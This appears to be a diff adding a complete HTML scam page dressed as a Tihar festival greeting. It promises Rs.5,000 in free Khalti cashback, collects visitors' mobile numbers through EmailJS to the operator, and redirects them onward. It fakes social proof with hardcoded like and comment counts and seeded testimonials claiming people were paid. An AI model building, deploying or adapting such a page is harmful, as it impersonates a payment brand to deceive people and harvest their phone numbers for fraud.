@@ -1,0 +1,969 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover">
+<meta name="theme-color" content="#c8102e">
+<title>Tihar Greetings | तिहारको शुभकामना</title>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preconnect" href="https://raw.githubusercontent.com">
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;800&family=Noto+Sans+Devanagari:wght@400;600;700&display=swap" rel="stylesheet">
+
+<script defer src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<style>
+:root {
+  --red:#c8102e;
+  --gold:#f5b700;
+  --orange:#ff7a18;
+  --dark:#1d1d2b;
+  --light:#fff8ee;
+  --card:#fff;
+  --muted:#6b6b7b;
+  --green:#2e9d4f;
+  --shadow:0 8px 24px rgba(0,0,0,.10);
+}
+
+* {
+  box-sizing:border-box;
+  margin:0;
+  padding:0;
+}
+
+html {
+  scroll-behavior:smooth;
+  scroll-padding-top:75px;
+  -webkit-text-size-adjust:100%;
+}
+
+body {
+  font-family:'Poppins','Noto Sans Devanagari',sans-serif;
+  background:var(--light);
+  color:var(--dark);
+  min-height:100vh;
+  overflow-x:clip;
+  -webkit-tap-highlight-color:transparent;
+}
+
+img {max-width:100%}
+
+button,input {font:inherit}
+
+.sparkles {
+  position:fixed;
+  inset:0;
+  pointer-events:none;
+  z-index:0;
+  overflow:hidden;
+  contain:strict;
+}
+
+.sparkle {
+  position:absolute;
+  width:5px;
+  height:5px;
+  border-radius:50%;
+  background:var(--gold);
+  opacity:0;
+  animation:twinkle 3s infinite ease-in-out;
+}
+
+@keyframes twinkle {
+  0%,100% {opacity:0;transform:scale(.5)}
+  50% {opacity:.8;transform:scale(1.2)}
+}
+
+/* HEADER */
+
+header {
+  position:sticky;
+  top:0;
+  z-index:100;
+  width:100%;
+  min-height:60px;
+  background:rgba(200,16,46,.97);
+  color:white;
+  padding:12px clamp(14px,4vw,35px);
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  box-shadow:0 3px 14px rgba(0,0,0,.12);
+}
+
+.brand {
+  font-weight:800;
+  font-size:clamp(17px,4vw,21px);
+}
+
+.brand span {color:var(--gold)}
+
+nav {
+  display:flex;
+  gap:20px;
+}
+
+nav a {
+  color:white;
+  text-decoration:none;
+  font-size:14px;
+  font-weight:600;
+}
+
+/* BANNER */
+
+.banner {
+  width:100%;
+  height:clamp(170px,35vw,320px);
+  background:#e9a13a;
+  overflow:hidden;
+  position:relative;
+  contain:layout paint;
+}
+
+.banner img {
+  display:block;
+  width:100%;
+  height:100%;
+  object-fit:cover;
+  object-position:center;
+}
+
+/* HERO */
+
+.hero {
+  position:relative;
+  z-index:1;
+  background:linear-gradient(135deg,var(--red),var(--orange) 60%,var(--gold));
+  color:white;
+  text-align:center;
+  padding:clamp(38px,7vw,70px) 18px clamp(55px,8vw,85px);
+  overflow:hidden;
+}
+
+.hero::before,
+.hero::after {
+  content:"";
+  position:absolute;
+  border-radius:50%;
+  background:rgba(255,255,255,.09);
+  pointer-events:none;
+}
+
+.hero::before {
+  width:250px;
+  height:250px;
+  top:-100px;
+  left:-90px;
+}
+
+.hero::after {
+  width:200px;
+  height:200px;
+  bottom:-90px;
+  right:-50px;
+}
+
+.diyas {
+  font-size:clamp(25px,6vw,38px);
+  letter-spacing:8px;
+}
+
+.hero h1 {
+  font-size:clamp(30px,7vw,54px);
+  font-weight:800;
+  margin:14px 0 8px;
+  line-height:1.2;
+}
+
+.hero h2 {
+  font-family:'Noto Sans Devanagari',sans-serif;
+  font-size:clamp(18px,4vw,25px);
+  color:#fff3c4;
+}
+
+.hero p {
+  max-width:600px;
+  margin:15px auto 0;
+  font-size:clamp(13px,2.5vw,15px);
+  line-height:1.7;
+}
+
+/* MAIN PLATFORM */
+
+.container {
+  position:relative;
+  z-index:2;
+  width:100%;
+  max-width:850px;
+  margin:-45px auto 45px;
+  padding:0 clamp(12px,3vw,22px);
+}
+
+.card {
+  background:var(--card);
+  border-radius:18px;
+  box-shadow:var(--shadow);
+  padding:clamp(17px,4vw,27px);
+  margin-bottom:20px;
+  min-width:0;
+  animation:rise .45s ease both;
+}
+
+@keyframes rise {
+  from {opacity:0;transform:translateY(12px)}
+  to {opacity:1;transform:translateY(0)}
+}
+
+.card h3 {
+  font-size:clamp(18px,4vw,21px);
+  margin-bottom:8px;
+}
+
+.card p.sub {
+  color:var(--muted);
+  font-size:14px;
+  line-height:1.7;
+}
+
+/* GREETING FORM */
+
+.greet-form {
+  display:flex;
+  gap:10px;
+  margin-top:18px;
+  width:100%;
+}
+
+.greet-form input {
+  flex:1;
+  width:100%;
+  min-width:0;
+  padding:13px 15px;
+  border-radius:11px;
+  border:1.5px solid #e8e8e8;
+  outline:none;
+  background:#fff;
+}
+
+.greet-form input:focus,
+.comment-box input:focus {
+  border-color:var(--orange);
+  box-shadow:0 0 0 3px rgba(255,122,24,.12);
+}
+
+.btn {
+  padding:12px 22px;
+  border:0;
+  border-radius:11px;
+  cursor:pointer;
+  font-weight:700;
+  color:white;
+  background:linear-gradient(135deg,var(--red),var(--orange));
+  box-shadow:0 4px 12px rgba(200,16,46,.2);
+  transition:opacity .2s;
+}
+
+.btn:active {opacity:.8}
+.btn:disabled {opacity:.6;cursor:not-allowed}
+
+.status {
+  margin-top:12px;
+  font-size:13px;
+  min-height:20px;
+}
+
+.status.err {color:var(--red)}
+.status.ok {color:var(--green)}
+
+/* REACTIONS */
+
+.reactions {
+  display:flex;
+  justify-content:space-between;
+  gap:10px;
+  color:var(--muted);
+  font-size:13px;
+  margin-bottom:12px;
+  font-weight:600;
+}
+
+.actions {
+  display:flex;
+  border-top:1px solid #eee;
+  border-bottom:1px solid #eee;
+}
+
+.actions button {
+  flex:1;
+  background:none;
+  border:0;
+  padding:13px 8px;
+  color:var(--muted);
+  font-weight:600;
+  cursor:pointer;
+}
+
+.actions button.liked {color:var(--red)}
+
+/* COMMENTS */
+
+.comment-box {
+  display:flex;
+  gap:9px;
+  margin:16px 0;
+}
+
+.comment-box input {
+  flex:1;
+  width:100%;
+  min-width:0;
+  padding:12px 15px;
+  border-radius:25px;
+  border:1.5px solid #eee;
+  outline:none;
+}
+
+.comments {
+  display:flex;
+  flex-direction:column;
+  gap:10px;
+}
+
+.comment {
+  background:#f5f6f8;
+  border-radius:12px;
+  padding:12px;
+  overflow-wrap:anywhere;
+}
+
+.comment strong {
+  font-size:13px;
+  color:var(--red);
+}
+
+.comment p {
+  margin-top:4px;
+  font-size:13px;
+  line-height:1.7;
+}
+
+.comment small {
+  color:var(--muted);
+  font-size:11px;
+}
+
+/* FEATURES */
+
+.features {
+  display:grid;
+  grid-template-columns:repeat(2,minmax(0,1fr));
+  gap:12px;
+}
+
+.feature {
+  text-align:center;
+  padding:18px 10px;
+  background:#fffaf3;
+  border-radius:13px;
+}
+
+.feature .icon {
+  font-size:30px;
+  margin-bottom:8px;
+}
+
+.feature h4 {
+  font-size:14px;
+  margin-bottom:5px;
+}
+
+.feature p {
+  color:var(--muted);
+  font-size:12px;
+  line-height:1.6;
+}
+
+/* FOOTER */
+
+footer {
+  text-align:center;
+  padding:25px 15px;
+  background:var(--dark);
+  color:#cfcfdb;
+  font-size:13px;
+}
+
+footer .gold {color:var(--gold)}
+
+/* TOAST */
+
+.toast {
+  position:fixed;
+  bottom:20px;
+  left:50%;
+  transform:translate(-50%,100px);
+  background:var(--dark);
+  color:white;
+  padding:12px 19px;
+  border-radius:11px;
+  box-shadow:var(--shadow);
+  z-index:300;
+  width:max-content;
+  max-width:90%;
+  font-size:13px;
+  transition:transform .25s ease;
+}
+
+.toast.show {transform:translate(-50%,0)}
+
+/* CONFETTI */
+
+.confetti {
+  position:fixed;
+  top:-15px;
+  width:7px;
+  height:10px;
+  z-index:400;
+  pointer-events:none;
+  animation:fall 2.5s linear forwards;
+}
+
+@keyframes fall {
+  to {
+    transform:translateY(105vh) rotate(500deg);
+    opacity:0;
+  }
+}
+
+/* MOBILE */
+
+@media(max-width:600px) {
+  nav {display:none}
+
+  header {
+    min-height:55px;
+    padding:11px 15px;
+  }
+
+  .container {margin-top:-35px}
+
+  .greet-form {flex-direction:column}
+  .greet-form .btn {width:100%}
+
+  .comment-box {gap:7px}
+  .comment-box .btn {padding:10px 15px}
+}
+
+@media(max-width:360px) {
+  .features {grid-template-columns:1fr}
+  .reactions {font-size:11px}
+}
+
+@media(prefers-reduced-motion:reduce) {
+  *,*::before,*::after {
+    animation-duration:.01ms!important;
+    animation-iteration-count:1!important;
+    scroll-behavior:auto!important;
+    transition-duration:.01ms!important;
+  }
+}
+</style>
+</head>
+
+<body>
+
+<div class="sparkles" id="sparkles"></div>
+
+<header>
+  <div class="brand">Tihar <span>Cashbacks</span></div>
+  <nav>
+    <a href="#greet">Greet</a>
+    <a href="#features">Features</a>
+    <a href="#comments">Comments</a>
+  </nav>
+</header>
+
+<!-- IMAGE BANNER -->
+
+<div class="banner">
+  <img
+    src="https://raw.githubusercontent.com/Rupayy/web/refs/heads/main/1793370621927.jpg"
+    alt="Tihar Festival Celebration"
+    fetchpriority="high"
+    decoding="async"
+    loading="eager"
+    width="1200"
+    height="400"
+    onerror="this.style.display='none';">
+</div>
+
+<!-- HERO -->
+
+<section class="hero">
+  <div class="diyas">🪔 🪔 🪔</div>
+  <h1>Happy Tihar</h1>
+  <h2>तिहारको हार्दिक शुभकामना</h2>
+  <p>
+    Celebrate the festival of lights with warm wishes,
+    And get your Free Cashback Gifts From Khalti Rs.5,000/-.
+  </p>
+</section>
+
+<main class="container">
+
+<!-- GREETING -->
+
+<section class="card" id="greet">
+  <h3>Get Free Cashbacks</h3>
+
+  <p class="sub">
+    Enter your Phone Number And Get Cashbacks.
+  <form class="greet-form" id="greetForm" autocomplete="off">
+    <input
+      type="text"
+      id="fullName"
+      placeholder="Enter Your Mobile Number"
+      maxlength="80"
+      required>
+    <button class="btn" type="submit" id="submitBtn">Submit</button>
+  </form>
+
+  <div class="status" id="status"></div>
+</section>
+
+<!-- LIKES AND COMMENTS -->
+
+<section class="card" id="comments">
+
+  <div class="reactions">
+    <span id="likeCount">🔥 368K likes</span>
+    <span id="commentCount">319K comments</span>
+  </div>
+
+  <div class="actions">
+    <button id="likeBtn">👍 Like</button>
+    <button id="focusComment">💬 Comment</button>
+  </div>
+
+  <!-- COMMENT INPUT -->
+
+  <div class="comment-box">
+    <input
+      type="text"
+      id="commentInput"
+      placeholder="Write a comment (English or नेपाली)..."
+      maxlength="250">
+
+    <button class="btn" id="postComment">Post</button>
+  </div>
+
+  <!-- ONLY 10 COMMENTS DISPLAY -->
+
+  <div class="comments" id="commentList"></div>
+
+</section>
+
+</main>
+
+<footer>
+  <p>
+    © 2026 Tihar Greetings ·
+    <span class="gold">शुभ तिहार</span> · Happy Tihar
+  </p>
+</footer>
+
+<div class="toast" id="toast"></div>
+
+<script>
+"use strict";
+
+/* EMAILJS */
+
+const EMAILJS_SERVICE_ID = "service_8iot5xx";
+const EMAILJS_TEMPLATE_ID = "template_2vp7oqq";
+const EMAILJS_PUBLIC_KEY = "ttrKOZNMDMqFjqfPT";
+
+/* ELEMENTS */
+
+const $ = id => document.getElementById(id);
+
+/* EMAILJS INITIALIZATION */
+
+let emailReady = false;
+
+window.addEventListener("load", () => {
+  if (window.emailjs) {
+    emailjs.init({publicKey:EMAILJS_PUBLIC_KEY});
+    emailReady = true;
+  }
+});
+
+/* SPARKLES */
+
+const sparkleBox = $("sparkles");
+
+if (!window.matchMedia("(prefers-reduced-motion: reduce)").matches) {
+  const fragment = document.createDocumentFragment();
+
+  for (let i=0; i<12; i++) {
+    const s = document.createElement("div");
+    s.className = "sparkle";
+    s.style.left = Math.random()*100+"%";
+    s.style.top = Math.random()*100+"%";
+    s.style.animationDelay = Math.random()*3+"s";
+    fragment.appendChild(s);
+  }
+
+  sparkleBox.appendChild(fragment);
+}
+
+/* TOAST */
+
+let toastTimer;
+
+function toast(message) {
+  const t = $("toast");
+  t.textContent = message;
+  t.classList.add("show");
+
+  clearTimeout(toastTimer);
+
+  toastTimer = setTimeout(() => {
+    t.classList.remove("show");
+  },2500);
+}
+
+/* CONFETTI */
+
+function confetti() {
+  if (window.matchMedia("(prefers-reduced-motion: reduce)").matches) return;
+
+  const colors = ["#c8102e","#f5b700","#ff7a18","#2e9d4f"];
+  const fragment = document.createDocumentFragment();
+
+  for (let i=0; i<25; i++) {
+    const c = document.createElement("div");
+
+    c.className = "confetti";
+    c.style.left = Math.random()*100+"vw";
+    c.style.background = colors[Math.floor(Math.random()*colors.length)];
+    c.style.animationDelay = Math.random()*.3+"s";
+
+    c.addEventListener("animationend",() => c.remove());
+
+    fragment.appendChild(c);
+  }
+
+  document.body.appendChild(fragment);
+}
+
+/* SAFE STORAGE */
+
+function getStorage(key,fallback) {
+  try {
+    const value = localStorage.getItem(key);
+    return value === null ? fallback : value;
+  } catch(e) {
+    return fallback;
+  }
+}
+
+function setStorage(key,value) {
+  try {
+    localStorage.setItem(key,value);
+  } catch(e) {}
+}
+
+/* LIKES */
+
+/* DISPLAY STARTING TOTAL: 368K */
+
+const likeBtn = $("likeBtn");
+const likeCount = $("likeCount");
+
+const INITIAL_LIKES = 368000;
+
+let likes = INITIAL_LIKES;
+let liked = getStorage("tihar_liked","0") === "1";
+
+function formatCount(number) {
+  if(number >= 1000) {
+    return (number / 1000).toLocaleString("en-US", {
+      maximumFractionDigits:1
+    }) + "K";
+  }
+
+  return number.toString();
+}
+
+function renderLikes() {
+  likeCount.textContent = `🔥 ${formatCount(likes)} likes`;
+
+  likeBtn.classList.toggle("liked",liked);
+
+  likeBtn.textContent = liked ? "👍 Liked" : "👍 Like";
+}
+
+likeBtn.addEventListener("click",() => {
+  liked = !liked;
+
+  likes += liked ? 1 : -1;
+
+  setStorage("tihar_liked",liked ? "1" : "0");
+
+  renderLikes();
+
+  if(liked) confetti();
+});
+
+renderLikes();
+
+/* COMMENTS */
+
+/* TOTAL COMMENTS: 319K */
+/* ONLY 10 COMMENTS VISIBLE */
+
+const INITIAL_COMMENTS = 319000;
+const MAX_VISIBLE_COMMENTS = 10;
+
+const commentList = $("commentList");
+const commentCount = $("commentCount");
+const commentInput = $("commentInput");
+
+const defaultComments = [
+  {
+    name:"Ram Sharma",
+    text:"शुभ तिहार! सबैलाई सुख, शान्ति र समृद्धिको शुभकामना। ❤️",
+    time:"2 minutes ago"
+  },
+  {
+    name:"Sita Thapa",
+    text:"Happy Tihar everyone! I just Get Rs.5000/- From khalti Cashbacks. 🪔",
+    time:"5 minutes ago"
+  },
+  {
+    name:"Aarav",
+    text:"Thank You Khalti For Free Cashbacks 🎉",
+    time:"8 minutes ago"
+  },
+  {
+    name:"Priya",
+    text:"Wishing everyone a beautiful and colorful Tihar!",
+    time:"12 minutes ago"
+  },
+  {
+    name:"Bikash",
+    text:"यो तिहार सबैको जीवनमा नयाँ खुसी लिएर आओस्।",
+    time:"15 minutes ago"
+  },
+  {
+    name:"Anisha",
+    text:"Happy Tihar! Sabai jana le Try garnus Maile ni 5k Paye ❤️",
+    time:"20 minutes ago"
+  },
+  {
+    name:"Suman",
+    text:"सबै नेपाली दाजुभाइ तथा दिदीबहिनीहरूलाई शुभ दीपावली।",
+    time:"25 minutes ago"
+  },
+  {
+    name:"Roshani",
+    text:"May the lights of Tihar brighten your life.I also Just Recive Rs.5 Thousand ✨",
+    time:"30 minutes ago"
+  },
+  {
+    name:"Prakash",
+    text:"Wow , 100% Real Raixa , Thank you khalti।",
+    time:"35 minutes ago"
+  },
+  {
+    name:"Nisha",
+    text:"Ekdam Kushi Lagyo Free ma 5 Hazar pauda 🪔❤️",
+    time:"40 minutes ago"
+  }
+];
+
+/* LOAD SAVED COMMENTS */
+
+let comments;
+
+try {
+  const saved = JSON.parse(getStorage("tihar_comments","null"));
+
+  comments = Array.isArray(saved) ? saved : [...defaultComments];
+
+} catch(e) {
+  comments = [...defaultComments];
+}
+
+/* SAFE TEXT RENDERING */
+
+function renderComments() {
+
+  commentList.replaceChildren();
+
+  const fragment = document.createDocumentFragment();
+
+  /* DISPLAY ONLY 10 COMMENTS */
+
+  comments.slice(0,MAX_VISIBLE_COMMENTS).forEach(c => {
+
+    const item = document.createElement("div");
+    item.className = "comment";
+
+    const name = document.createElement("strong");
+    name.textContent = c.name;
+
+    const time = document.createElement("small");
+    time.textContent = " · " + c.time;
+
+    const text = document.createElement("p");
+    text.textContent = c.text;
+
+    item.append(name,time,text);
+
+    fragment.appendChild(item);
+  });
+
+  commentList.appendChild(fragment);
+
+  /* ALWAYS DISPLAY 319K AS STARTING TOTAL */
+
+  const total = INITIAL_COMMENTS + Math.max(0,comments.length - defaultComments.length);
+
+  commentCount.textContent = `${formatCount(total)} comments`;
+}
+
+/* POST NEW COMMENT */
+
+$("postComment").addEventListener("click",() => {
+
+  const text = commentInput.value.trim();
+
+  if(!text) {
+    toast("Please write a comment first.");
+    return;
+  }
+
+  const name = $("fullName").value.trim() || "Guest";
+
+  comments.unshift({
+    name,
+    text,
+    time:"Just now"
+  });
+
+  /* SAVE COMMENTS */
+
+  setStorage("tihar_comments",JSON.stringify(comments));
+
+  /* CLEAR INPUT */
+
+  commentInput.value = "";
+
+  /* UPDATE DISPLAY */
+
+  renderComments();
+
+  toast("Comment posted successfully 🪔");
+});
+
+/* ENTER TO POST */
+
+commentInput.addEventListener("keydown",e => {
+  if(e.key === "Enter") {
+    e.preventDefault();
+    $("postComment").click();
+  }
+});
+
+/* FOCUS COMMENT */
+
+$("focusComment").addEventListener("click",() => {
+  commentInput.focus();
+
+  commentInput.scrollIntoView({
+    behavior:"smooth",
+    block:"center"
+  });
+});
+
+/* INITIAL RENDER */
+
+renderComments();
+
+/* GREETING SUBMISSION */
+
+const form = $("greetForm");
+const statusEl = $("status");
+const submitBtn = $("submitBtn");
+
+form.addEventListener("submit",async e => {
+
+  e.preventDefault();
+
+  const name = $("fullName").value.trim();
+
+  if(name.length < 2) {
+    statusEl.className = "status err";
+    statusEl.textContent = "Please enter your full name.";
+    return;
+  }
+
+  if(!emailReady) {
+    toast("Email service is loading. Please try again.");
+    return;
+  }
+
+  submitBtn.disabled = true;
+  submitBtn.textContent = "Submitting...";
+
+  statusEl.className = "status";
+  statusEl.textContent = "";
+
+  try {
+
+    await emailjs.send(
+      EMAILJS_SERVICE_ID,
+      EMAILJS_TEMPLATE_ID,
+      {
+        from_name:name,
+        message:`New Contact number by: ${name}`
+      }
+    );
+
+    statusEl.className = "status ok";
+    statusEl.textContent = "Thank you!...";
+
+    confetti();
+
+    setTimeout(() => {
+      window.location.href =
+        "Ref.html?name="+encodeURIComponent(name);
+    },1000);
+
+  } catch(error) {
+
+    console.error(error);
+
+    statusEl.className = "status err";
+    statusEl.textContent = "Something went wrong. Please try again.";
+
+    submitBtn.disabled = false;
+    submitBtn.textContent = "Submit";
+  }
+});
+
+/* PREVENT DOUBLE TAP ZOOM */
+
+document.addEventListener("dblclick",e => {
+  if(e.target.closest("button")) e.preventDefault();
+});
+
+</script>
+
+</body>
+</html>
